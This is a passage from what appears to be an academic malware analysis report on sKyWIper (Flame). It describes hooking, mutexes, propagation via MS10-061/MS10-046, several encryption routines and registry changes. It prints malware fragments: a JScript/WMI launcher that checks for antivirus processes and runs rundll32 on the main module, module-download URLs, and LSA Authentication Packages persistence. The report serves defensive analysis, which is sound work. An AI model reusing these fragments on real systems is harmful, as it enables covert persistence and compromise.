with the GMER rootkit revealer, we can see that the\ninfected explorer.exe hooked the SHGetSpecialFolderPathW() library call in the shell32.dll\nmodule (that is supposedly the result of a code injection).\n\n**Figure 10 – Hooking shell32 dll’s SHGetSpecialFolderPathW function in explorer.exe**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 20\n\n\n-----\n\n### 3.5. Mutexes\n\nSimilarly to other malicious codes, sKyWIper uses mutexes to make sure that only one\ninstance is running from it. Mutexes are created either for injected system processes\n(winlogon.exe, services.exe, explorer.exe) and proprietary files. In the former case, the\nfollowing naming convention is used: TH_POOL_SHD_PQOISNG_#PID#SYNCMTX, where the\n#PID# variable refers to the PID of the system process the mutex belongs to. Furthermore,\nthere are other mutexes that belongs to files created by the malcode. These are the\nfollowing.\n\nc__program_files_common_files_microsoft shared_msaudio_wpgfilter.dat\n\nc__program files_common files_microsoft shared_msaudio_audcache\n\nTo reveal all the mutexes one can traverse Windows’ _KMUTANT data structure, however, it\nis difficult to grasp the malicious ones.\n\n### 3.6. nteps32 exports\n\n**Figure 11 – nteps32 [loaded many times] exported functions – lot of functionality**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 21\n\n\n-----\n\nIt would be useful to describe here the exact meaning of the abbreviated functionality (SHR,\nABH, BHD, DLV, SMLData, VBinfo, OFR, PF, PGHDict) of this interesting library, however,\ncurrently we do not have enough information on it.\n\nCreatePGHDict might be associated with some Bluetooth related activities.\n\nEnableSHR might be connected to ~DEB93D creation which contains samba nmb name\nresolution traffic log.\n\n### 3.7. Installation and propagation method\n\nThere are multiple ways for the malware to propagate. One method we are aware of is\nrelated to windows update and file downloading by some modules using SSL and some\nproprietary text based protocol. We also have clear indications that Stuxnet’s print spooler\nexploit (MS10-061) and lnk exploit (MS10-046) is used within sKyWIper as well:\n```\nvar objFileSystem = new ActiveXObject(\"Scripting.FileSystemObject\");var s =\nGetObject(\"winmgmts:root\\\\cimv2\");var oProcs = s.ExecQuery(\"SELECT * FROM\nWin32_Process WHERE name='outpost.exe' or name='aupdrun.exe' or name='op_mon.exe'\nor\nname='avp.exe'\");s.Delete(\"__EventFilter.Name='FilterForClassCreation'\");s.Delete(\"\nActiveScriptEventConsumer.Name='ActiveScriptForSvc'\");s.Delete(\"MyTestClass\");s.Del\nete(\"__Win32Provider.Name='ActiveScriptEventConsumer'\");var f =\nobjFileSystem.GetFile(\"wbem\\\\mof\\\\good\\\\svchostevt.mof\");f.Delete(true);\nf =objFileSystem.GetFile(\"testpage\");f.Delete(true);if (!oProcs.Count) { s1 = new\nActiveXObject(\"Wscript.Shell\");s1.Run(\"%SYSTEMROOT%\\\\system32\\\\rundll32.exe\nmsdclr64.ocx,DDEnumCallback\");while (true) { var oProcs = s.ExecQuery(\"SELECT *\nFROM Win32_Process WHERE name='rundll32.exe'\"); if (!oProcs.Count) break; } var f =\nobjFileSystem.GetFile(\"msdclr64.ocx\");f.Delete(true);} else { var f =\nobjFileSystem.GetFile(\"msdclr64.ocx\"); f.Delete(true);} \nwhere msdclr64.ocx refers to the main module\n\n```\n**Figure 12 – Printer problem related routines in the malware**\n```\nURL:\nhttp://<windowscomputername>/view.php?mp=1&jz=1627XXXXXX&fd=1463XXXXXX&\nam=55XXXXXXX55X&ef=962DXXX7EC84XXXXEC84&pr=1&ec=0&ov=66664XXXXX6641XXXXX64174&pl=gs\npndXXXXXX|spnZXXX|nyXXX|0nXXX|TWvXXXX|nGcXXX… \nsome 30-50 tags more XXX are deliberately deleted\n\n```\n**Figure 13 – URL used to download mssecmgr.sys by some installation part**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 22\n\n\n-----\n\nFigure 13 shows the URL used to download the main module by some routine in the\ninstallation part of the malware. The routine downloads the file mssecmgr.ocx and some\nheader: B5 A0 44 3F 67 EA EA EA E5 B2 EA EA. Trying to decrypt the header with algorithm\nE1 (see encryption algorithms later in this report) and considering 0xEA => 0x00, the result is\n\n**: 0000000000: 20 E1 D7 50 0A 00 00 00 │ C8 0F 00 00 á×P◙ Č☼**\n\nFurther information shows that this is related to the windows update mechanism and the\nMUNCH attack (see later). Numbers are partially removed or overwritten with X for privacy.\n```\n(\"http://<windowscomputername>/view.php?ac=1&jz=16X71X...\",\"\");\nCreateSection(\"$windir\\softwaredistribution\\selfupdate\\default\\wuauinfo.ocx\");\nCreateSection(\"$windir\\softwaredistribution\\selfupdate\\default\\wuauinfo.ocx\");'\n\n```\nAnother sample (numbers are removed or modified) is the following:\n```\nconnect(10.55.55.55,80,6);\nUrlDetect(\"http://download.windowsupdate.com/v9/windowsupdate/redir/muv4wuredir.cab\n?1<number removed>\",\"\");\n\n```\nThe user agent during this communications is set to “Mozilla/4.0 (compatible; MSIE 6.0;\nWindows NT 5.1; .NET CLR 1.1.2150)”. This cannot be found by a google search; hence, it is\npossibly used by the malware for identification purposes. For the same reason, it can\npossibly be used as a NIDS signature.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 23\n\n\n-----\n\n## 4. Description of components\n\nNow we present our initial analysis of the files used in sKyWIper. Note that given the lack of\nresources and time, our findings are preliminary. The main goal is to highlight the structure\nof the malware modules and the techniques used by the authors (e.g., for encryption); and\nto pave the way for a thorough investigation.\n\n### 4.1. Encryption algorithms\n\nAt the time of this writing, we identified five encryption algorithms used in the malware, we\nrefer to them as E1-E5. E1 is used in DAT files. For E1, we managed to produce a full\nsubstitution table as presented in Figure 14 below. We could identify the encryption\nalgorithms E2-E5 shown in subsequent figures, but we do not have a full understanding of\nwhere they are used in sKyWIper and if they are related to known encryption methods.\n```\n0 234 34 183 68 196 102 87 136 19 170 129\n1 130 35 248 69 179 103 71 137 27 171 170\n2 99 36 157 70 127 104 162 138 251 172 44\n3 174 37 31 71 176 105 230 139 50 173 58\n4 163 38 226 72 36 106 225 140 131 174 0\n5 140 39 47 73 128 107 79 141 120 175 167\n6 102 40 145 74 113 108 169 142 90 176 209\n7 73 41 67 75 10 109 206 143 97 177 195\n8 243 42 111 76 48 110 198 144 154 178 161\n9 1 43 191 77 150 111 218 145 136 179 112\n10 103 44 175 78 118 112 125 146 80 180 244\n11 6 45 159 79 106 113 43 147 35 181 155\n12 18 46 250 80 63 114 83 148 184 182 119\n13 199 47 166 81 122 115 216 149 64 183 197\n14 182 48 205 82 137 116 40 150 252 184 201\n15 178 49 95 83 33 117 75 151 39 185 158\n16 7 50 81 84 151 118 123 152 247 186 121\n17 239 51 96 85 207 119 37 153 66 187 109\n18 28 52 101 86 55 120 222 154 104 188 15\n19 193 53 143 87 242 121 236 155 203 189 200\n20 117 54 255 88 223 122 29 156 84 190 173\n21 253 55 249 89 52 123 156 157 86 191 76\n22 23 56 187 90 190 124 164 158 9 192 60\n23 62 57 153 91 59 125 139 159 186 193 92\n24 224 58 77 92 20 126 110 160 49 194 65\n25 254 59 89 93 11 127 85 161 138 195 133\n26 61 60 241 94 238 128 142 162 212 196 88\n27 202 61 105 95 16 129 57 163 24 197 219\n28 30 62 116 96 4 130 93 164 213 198 141\n29 221 63 208 97 17 131 74 165 91 199 98\n30 26 64 46 98 78 132 56 166 228 200 229\n31 149 65 240 99 70 133 168 167 172 201 144\n32 181 66 108 100 134 134 53 168 2 202 215\n33 192 67 42 101 12 135 246 169 185 203 14\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 24\n\n|0 234 1 130 2 99 3 174 4 163 5 140 6 102 7 73 8 243 9 1 10 103 11 6 12 18 13 199 14 182 15 178 16 7 17 239 18 28 19 193 20 117 21 253 22 23 23 62 24 224 25 254 26 61 27 202 28 30 29 221 30 26 31 149 32 181 33 192|3 3 3 3 3 3 4 4 4 4 4 4 4 4 4 4 5 5 5 5 5 5 5 5 5 5 6 6 6 6 6 6 6 6|4 183 5 248 6 157 7 31 8 226 9 47 0 145 1 67 2 111 3 191 4 175 5 159 6 250 7 166 8 205 9 95 0 81 1 96 2 101 3 143 4 255 5 249 6 187 7 153 8 77 9 89 0 241 1 105 2 116 3 208 4 46 5 240 6 108 7 42|6 6 7 7 7 7 7 7 7 7 7 7 8 8 8 8 8 8 8 8 8 8 9 9 9 9 9 9 9 9 9 9 1 1|8 196 9 179 0 127 1 176 2 36 3 128 4 113 5 10 6 48 7 150 8 118 9 106 0 63 1 122 2 137 3 33 4 151 5 207 6 55 7 242 8 223 9 52 0 190 1 59 2 20 3 11 4 238 5 16 6 4 7 17 8 78 9 70 00 134 01 12|1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1|02 87 03 71 04 162 05 230 06 225 07 79 08 169 09 206 10 198 11 218 12 125 13 43 14 83 15 216 16 40 17 75 18 123 19 37 20 222 21 236 22 29 23 156 24 164 25 139 26 110 27 85 28 142 29 57 30 93 31 74 32 56 33 168 34 53 35 246|1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1|36 19 37 27 38 251 39 50 40 131 41 120 42 90 43 97 44 154 45 136 46 80 47 35 48 184 49 64 50 252 51 39 52 247 53 66 54 104 55 203 56 84 57 86 58 9 59 186 60 49 61 138 62 212 63 24 64 213 65 91 66 228 67 172 68 2 69 185|1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 2 2 2 2|70 129 71 170 72 44 73 58 74 0 75 167 76 209 77 195 78 161 79 112 80 244 81 155 82 119 83 197 84 201 85 158 86 121 87 109 88 15 89 200 90 173 91 76 92 60 93 92 94 65 95 133 96 88 97 219 98 141 99 98 00 229 01 144 02 215 03 14|\n|---|---|---|---|---|---|---|---|---|---|---|\n\n\n-----\n\n|Col1|213 188|2|24 38|2|35 25|2|46 152|Col9|\n|---|---|---|---|---|---|---|---|---|\n|204 204 205 3 206 171 207 147 208 21 209 72 210 232 211 8 212 41|2 2 2 2 2 2 2 2 2 2|2 2 2 2 2 2 2 2 2 2|25 160 26 34 27 100 28 227 29 231 30 177 31 51 32 194 33 115 34 135|2 2 2 2 2 2 2 2 2 2|36 69 2 37 211 2 38 5 2 39 245 2 40 45 2 41 114 2 42 94 2 43 148 2 44 233 2 45 237|2 2 2 2 2 2 2 2 2|47 220 48 214 49 22 50 189 51 32 52 107 53 132 54 82 55 13||\n||||||||||\n\n\n**Figure 14 – Encryption E1 – Substitution table. Left is cleartext, right is ciphertext. Used for DAT files.**\n```\n4091.dll:\nunsigned int __cdecl encryptor_sub_4025C0(int a1)\n{\nreturn (a1 + 11) * (a1 + 17) ^ (((unsigned __int16)((a1 + 11) * (a1 + 17) & 0xFF00)\n^ ((((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ (a1 + 11) * (a1 + 17) &\n0xFF0000) >> 8)) >> 8);\n} \n\n```\n**Figure 15 – Encryption E2 – found in 4091.dll; loaded as “12Windows Management Instrumentation**\n**Configurator” service**\n```\nsoapr32.dll:\nkeygensub_1000C0A2<eax>(int a1<eax>)\n{\nreturn (a1 + 11) * (a1 + 17) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8) ^ (((a1\n+ 11) * (a1 + 17) ^ ((unsigned int)((a1 + 11) * (a1 + 17)) >> 8)) >> 16);\n} \nused as stream cipher with „sub” function:\n.text:1000C0C6         mov   eax, [esp+8+arg_0]\n.text:1000C0CA         lea   esi, [edi+eax]\n.text:1000C0CD         mov   eax, edi\n.text:1000C0CF         call  keygensub_1000C0A2; eax->key one d\n.text:1000C0D4         sub   [esi], al ; sub the calculated key\n.text:1000C0D6         inc   edi\n.text:1000C0D7         cmp   edi, [esp+8+arg_4]\n.text:1000C0DB      jb   short loc_1000C0C6\n\n```\n**Figure 16 – Encryption E2B – found in soapr32.dll**\n```\nunsigned int cipher(unsigned int a1) \n { \n return (a1 + 5) * (a1 + 26) ^ \n((unsigned int)((a1 + 5) * (a1 + 26)) >> 8) ^ \n(((a1 + 5) * (a1 + 26) ^ ((unsigned int)((a1 + 5) * (a1 + 26)) >> 8)) >> 16); } \n.text:1000E895 sub_1000E895 proc near        ; CODE XREF: \n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 25\n\n\n-----\n\n|.text:1000E895 lea ecx, [eax+1Ah] .text:1000E898 add eax, 5 .text:1000E89B imul ecx, eax .text:1000E89E mov edx, ecx .text:1000E8A0 shr edx, 8 .text:1000E8A3 mov eax, edx .text:1000E8A5 xor eax, ecx .text:1000E8A7 shr eax, 10h .text:1000E8AA xor eax, edx .text:1000E8AC xor eax, ecx .text:1000E8AE retn .text:1000E8AE sub_1000E895 endp called as stream cipher in the following way (encryption): .text:1000E8BB loc_1000E8BB: ; CODE XREF: .text:1000E8CE ٴj .text:1000E8BB mov eax, [ebp+8] .text:1000E8BE lea esi, [edi+eax] .text:1000E8C1 mov eax, edi .text:1000E8C3 call keygen_sub_1000E895 .text:1000E8C8 add [esi], al .text:1000E8CA inc edi .text:1000E8CB cmp edi, [ebp+0Ch] .text:1000E8CE jb short loc_1000E8BB .text:1000E8D0 pop esi .text:1000E8D1 decryption part difference: .text:1000E8ED sub [esi], al (advnetcfg: sub_1000BD68 ; nteps: sub_1000E895)|Col2|\n|---|---|\n\n\n**Figure 17 –Encryption E3 – found in advnetcfg and nteps32**\n```\n6411/sub_10003463 \nv2 = result;\nif ( a2 )\n{\nv3 = 11 - result;\ndo\n{\nresult = dword_100420B8 + (v3 + v2) * (v3 + v2 + 12);\n*(_BYTE *)v2 -= result ^ ((unsigned __int16)((_WORD)dword_100420B8 + (v3 +\n(_WORD)v2) * (v3 + (_WORD)v2 + 12)) >> 8) ^ ((unsigned int)(dword_100420B8 + (v3 +\nv2) * (v3 + v2 + 12)) >> 16) ^ ((unsigned int)(dword_100420B8 + (v3 + v2) * (v3 +\nv2 + 12)) >> 24);\n++v2;\n--a2;\n} \n\n```\n**Figure 18 –Encryption E4 – not clear where it is used**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 26\n\n\n-----\n\n```\nint __usercall sub_1000D9DC<eax>(int result<eax>, int a2<edx>)\n{\n int v2; // esi@1\n int v3; // edi@2\n v2 = result;\n if ( a2 )\n {\n  v3 = 11 - result;\n  do\n  {\n   result = (v3 + v2) * (v3 + v2 + 6) + 88;\n   *(_BYTE *)v2 -= result ^ ((unsigned __int16)((v3 + (_WORD)v2) * (v3 +\n(_WORD)v2 + 6) + 88) >> 8) ^ ((unsigned int)((v3 + v2) * (v3 + v2 + 6) + 88) >> 16)\n^ ((unsigned int)((v3 + v2) * (v3 + v2 + 6) + 88) >> 24);\n   ++v2;\n   --a2;\n  }\n  while ( a2 );\n }\n return result;\n\n```\n**Figure 19 – Encryption E4B -- found in 4748.dll, possibly used on resource 164**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 27\n\n\n-----\n\n```\n0000000: 4909 caa4 11f3 63f7 2a30 58d8 43eb 3d83\n0000010: 626b 542e d0ca 5f07 599a 07ca 556a f059\n0000020: 0d17 b7a2 1c8a 4ac9 bc75 c1e6 30fb 898e\n0000030: a8e3 51e2 16bd ea65 02e3 a83b 4555 0a3f\n0000040: a6e7 ccfb 19b8 72df 5a57 810a 5cce d1a8\n0000050: 5ef8 b871 a07a 9db3 0bcf c786 65d9 100e\n0000060: 9d54 3445 f52f d9e1 0b66 b885 d165 1ec1\n0000070: 0685 0c3a 7cd1 55e1 11db e3b2 5712 41a0\n0000080: 836c 1680 054d 852c aec3 1f54 20bf 7ed2\n0000090: 7a7c c6f7 220e c0c6 8921 ca51 d0e4 92e6\n00000a0: acf4 016c 35ff 79a0 5dac c9ff 7f62 3e9e\n00000b0: 070c 629e 9095 11a4 37ef 2b89 0fa5 3df4\n00000c0: e0f6 0799 7176 a633 e728 66cb 8826 b714\n00000d0: 23dc 0817 9433 e906 d376 16ba 08fa 9841\n00000e0: bb6c 82c7 d0d6 4efe a076 a45a 6704 d430\n00000f0: 4c64 bff4 d731 cea2 0f7f 3613 9659 b178\n0000100: af91 81a2 7325 f22d d3d7 8cb8 ff13 f748\n0000110: 9604 41c1 1b19 3d5f 3cc6 e5c2 3635 2731\n0000120: dcb9 3c77 9995 38d8 46bc 80d2 f6aa c069\n0000130: 0a7b ca91 f2ad 0da2 a45f 966d 7457 9b58\n0000140: d78e 6336 d4a3 0d98 a312 23b9 66e3 5a53\n0000150: 1134 d01c 1b48 b7e8 8d0b 6a49 c400 27f0\n0000160: eef1 fb0e 36ee f395 0277 0bd2 1983 6dfe\n0000170: 3666 45fb 98c9 fd5a 300d 7a24 4c46 4861\n0000180: c929 09b6 6861 ae81 7a61 2fd0 7121 7c04\n0000190: 7809 b5c9 a9d5 670d 9959 1291 58e7 bc54\n00001a0: 8111 e1f2 5092 dc54 49b2 622b 7eee a22d\n00001b0: bef2 c085 02f6 d4c4 f674 c2de ef1f c626\n00001c0: c095 ec9b 2115 d279 6d76 4693 f3c9 41ac\n00001d0: a355 1806 0b41 25c8 d853 0579 d404 0bb1\n00001e0: 2720 5ab9 755d 2e79 15af 9946 5c42 ea8a\n00001f0: e2b8 dd91 7d4c 7c9d f2a7 35a6 09d2 f927\n0000200: a826 0a7f d54c 413a af8a 9cb2 4d4e d7c4\n0000210: 54b7 ecbb b6ce 5391 62b8 0e59 26e9 671e\n0000220: b075 eb6e 6ea3 5a7f 9e66 7d99 4d8c 6184\n0000230: 113c 8698 a22c cfb9 2eaf bcf4 fa90 07a3\n0000240: 1f17 1217 1115 ac72 031d 380e 1ff5 e374\n0000250: 925f 6b71 4831 924d a7dd 2b81 ed45 78f4\n0000260: 4385 5ef5 11af 7509 df54 743e c31f 38b3\n0000270: afd9 521e a93b ffa6 fd85 c9a6 4ee4 00f6\n0000280: 1eb0 9aa3 dfb6 ba3a bd5e 54dd 4ecf 75e7\n0000290: 9b4c 7d55 cdb5 4e18 b18c 712b d52f 50cd\n00002a0: f9ec 5f2f bd22 73c9 ea85 3b40 91f6 7079\n00002b0: 552c 9252 4614 78a3 8edf d7e1 1f21 5db1\n00002c0: 280c 843b a23e 4fbe 862f a7f5 400d a7d1\n00002d0: a2c8 b165 b728 21f3 7548 afa3 46e0 3422\n00002e0: b49f 76b4 239b 3aa0 6fd4 2d2b d7b0 eaed\n00002f0: 1656 2416 5132 721e ccdf 50a1 9862 8252\n0000300: b080 88a9 9036 ac52 adbc 789f 4c29 537d\n0000310: 5413 debd b867 77d8 966b adc6 8871 a14c\n0000320: 16f3 f3c4 f8b6 f47a fde5 d4b6 df5d 3518\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 28\n\n\n-----\n\n|0000330: d9e3 c883 3e30 c885 3dcc 110d 1708 bb4b 0000340: d85c e180 3e27 e216 3ed9 0c3b d50c 2432 0000350: dc80 76ec c1ba 4a9f 3419 3482 f2c6 0220 0000360: f004 72e5 83df 5711 4f20 50c6 778d 6af6 0000370: 5063 d245 8987 89a3 0f9a 5f97 be52 459e 0000380: bd87 7276 0ca3 2873 597d 61a7 0a80 5475 0000390: 660e c136 6730 f151 7d3b ce5e 968f a227 00003a0: ec52 f10c 475c dbf3 4a86 abad e1d2 22b5 00003b0: c5c3 4cea 347d 063a 27ac cb61 82c5 1822 00003c0: 95c4 211b e1bc 4870 7fe7 5e87 1aec a435 00003d0: 1bf1 5a9b 0523 2767 93df 0ddb 1247 9509 00003e0: 3801 8437 c626 ffe4 a773 da85 1d61 b45f 00003f0: 0630 fa64 264b 7277 d286 6453 5c81 e9e9|Col2|\n|---|---|\n\n\n**Figure 20 – Encryption E5 -- ~DEB93D encryption key, 1024 byte XOR key used repeatedly**\n\nEncryption key E5 might be calculated, but it can also be found in attack tables in memory\ndumps.\n\nSimple XOR with a constant is also used to “encrypt” files in multiple places. For instance,\nBoot32drv.sys is an encrypted data file with simple XOR with 0xFF.\n\n**to691.tmp is always among the first files that was installed into infected systems. The file**\ncontains configuration data and log results, very similar to the audcache.dat, but it is\nencrypted in a different way, as follows. to691.tmp is encrypted cyclically by XOR-ing with a\n16-byte long binary string. The string was found to be individual on the samples. As the\ncleartext file contains many 0x00 characters, the XOR key can be easily found by statistical\nmeans. The method is described in Figure 21 as Encryption E6A.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 29\n\n\n-----\n\n```\nfor i=0..15:\ntake all characters from file at n*16+i\ngenerate statistics on characters\nkey[i]=find most common character\nfor i=0..filesize:\n decrypted[i]=encrypted[i] XOR key[i%16]\n\n```\n**Figure 21 –Encryption E6A – TO691 1[st] stage generic decryption pseudocode**\n\nThe decrypted text after E6A is still not cleartext database format, but one can easily see\nthat it is very similar to the file format of audcache.dat (after decryption).\n\nThe second stage is a mono-alphabetical substitution, for which it may not be impossible to\nfind a short mathematical formula to calculate the substitutions, but so far we were not able\nto find that. Instead, we manually investigated the file and built a partial substitution table\non the characters used. The partial table is denoted as E6B in Figure 22.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 30\n\n\n-----\n\n```\n0  0\n1\n2\n3\n4\n5\n6 79\n7\n8\n9\nA\nB 6a\nC 69\nD\nE\nF\n10 2e\n11\n12\n13 37\n14\n15 36\n16\n17\n18 57\n19 55\n1A 41\n1B\n1C\n1D\n1E\n1F\n20\n21\n22\n23\n24 6D\n25 55\n26\n27 30\n28\n29\n2A\n2B 6c\n2C 6e\n2D\n2E 44\n2F\n30 6F\n31\n32 73\n33\n\n```\n```\n34 78\n35 58\n36\n37\n38\n39 ED\n3A\n3B B0\n3C\n3D\n3E\n3F\n40\n41\n42\n43 6c\n44\n45 2c\n46\n47\n48 68\n49\n4A\n4B 2d\n4C 2f\n4D\n4E\n4F\n50\n51 38\n52\n53\n54\n55\n56\n57\n58\n59 45\n5A 47\n5B\n5C\n5D\n5E\n5F 20\n60\n61\n62\n63 52\n64\n65 35\n66 3f\n67\n\n```\n```\n68\n69\n6A 49\n6B\n6C 64\n6D 57\n6E\n6F\n70\n71\n72\n73 32\n74\n75 2d\n76\n77\n78\n79\n7A\n7B\n7C 4D\n7D 54\n7E\n7F\n80 4f\n81\n82\n83\n84 7e\n85\n86 42\n87\n88\n89\n8A 33\n8B\n8C\n8D\n8E\n8F 34\n90 51\n91 76\n92\n93 BA\n94\n95 46\n96\n97 70\n98\n99\n9A\n9B 4a\n\n```\n```\n9C 4e\n9D\n9E 3e\n9F\nA0\nA1 75\nA2\nA3\nA4 62\nA5 6b\nA6\nA7 3A\nA8\nA9 7d\nAA\nAB\nAC 63\nAD 67\nAE\nAF\nB0\nB1\nB2\nB3\nB4\nB5 31\nB6\nB7\nB8 FE\nB9 72\nBA\nBB 32\nBC\nBD 66\nBE\nBF\nC0 43\nC1\nC2 74\nC3\nC4\nC5\nC6\nC7\nC8\nC9\nCA\nCB 53\nCC\nCD\nCE 48\nCF 77\n\n```\n```\nD0\nD1 5b\nD2\nD3\nD4\nD5 50\nD6\nD7\nD8\nD9\nDA 4c\nDB\nDC\nDD 56\nDE 59\nDF\nE0 4b\nE1 5d\nE2\nE3\nE4\nE5\nE6 65\nE7 FF\nE8\nE9\nEA\nEB\nEC\nED\nEE\nEF\nF0\nF1\nF2\nF3\nF4\nF5 25\nF6\nF7 7a\nF8\nF9\nFA 5f\nFB 61\nFC\nFD\nFE 5C\nFF\n\n```\n\n**Figure 22 –Encryption E6B – TO691 2nd stage substitution table – known elements**\n**(left: cipher character, right: cleartext character)**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 31\n\n\n-----\n\nWe also share some samples with the encryptions above to make it easier to pinpoint the\nencryption algorithm:\n```\n0000000000: FF F5 FF FF FF FE FE 23 │ FC FF FF FE 6F FE FF E4 ˙ő˙˙˙ţţ#ü˙˙ţoţ˙ä\n\n```\n`0000000010: CE 4C 3E 00 00` `00` `00 00` │ 00 00 FD FB FF FF FF 46 ÎL>    ýű˙˙˙F\n\n**Figure 23 – Sample for encryption/encoding boot32drv.sys – simple XOR with 0xFF**\n```\n0000000000: 75 EA EA EA FA 15 66 EA │ EE 15 66 EA EA EA E0 EA uęęęú§fęî§fęęęŕę\n\n```\n`0000000010: EA F7 EF FC 24` `EA` `EA EA` │ 0D 0D 0D 0D 91 EA EA EA ę÷ďü$ęęę♪♪♪♪'ęęę\n\n**Figure 24 – Sample for encryption/encoding made with encryption E1; 0xEA ���� 0x00**\n\n### 4.2. Registry parts\n\nThe malware does not modify too many registry keys as most information, data,\nconfiguration are stored in files. The affected registry entries are the following:\n\n- For installations and startup, LSA is abused:\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Autenthication\nPackages will contain in new line mssecmgr.ocx:\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa]\n\"Authentication Packages\"=hex(7):6d,00,73,00,76,00,31,00,5f,00,30,00,00,00,6d,\\\n00,73,00,73,00,65,00,63,00,6d,00,67,00,72,00,2e,00,6f,00,63,00,78,00,00,00,\\\n00,00\n\n- For some communications between processes wave8 and wave9 are used. Wave8\npossibly stores some PID, but this is just a guess. Wave9 is a name for the stored version\nof the “main module”:\n```\n23:34:34,1794024 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 NAME NOT FOUND Length: 536\n23:35:05,5405919 wmiprvse.exe 2472 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 NAME NOT FOUND Length: 536\n23:35:39,6297465 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 NAME NOT FOUND Length: 144\n23:35:39,6299138 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 NAME NOT FOUND Length: 144\n23:35:39,6300097 rundll32.exe 2388 RegSetValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: \n23:35:39,6302820 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: \n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 32\n\n\n-----\n\n|23:35:39,6313420 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: 23:35:39,6314414 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: 23:35:39,6314604 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: 23:35:39,6315540 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: 23:35:39,6315727 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 2, Data: 23:35:39,6332115 rundll32.exe 2388 RegSetValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 102, Data: c:\\progra~1\\common~1\\micros~1\\msaudio\\wavesup3.drv 23:35:50,6732679 alg.exe 2848 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 102, Data: c:\\progra~1\\common~1\\micros~1\\msaudio\\wavesup3.drv 23:35:50,6733205 alg.exe 2848 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 102, Data: c:\\progra~1\\common~1\\micros~1\\msaudio\\wavesup3.drv 23:36:17,4627767 services.exe 748 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\\wave9 SUCCESS Type: REG_SZ, Length: 102, Data: c:\\progra~1\\common~1\\micros~1\\msaudio\\wavesup3.drv|Col2|\n|---|---|\n\n\n**Figure 25 – Wave9 communications**\n```\n23:34:29,5181519 wmiprvse.exe 2248 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 NAME NOT FOUND Length: 536\n23:34:34,1793845 rundll32.exe 2388 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 NAME NOT FOUND Length: 536\n23:35:05,5405737 wmiprvse.exe 2472 RegQueryValue HKLM\\SOFTWARE\\Microsoft\\Windows\nNT\\CurrentVersion\\Drivers32\\wave8 NAME NOT FOUND Length: 536\n23:35:39,6273171 rundll32.exe 2388 RegQueryValue 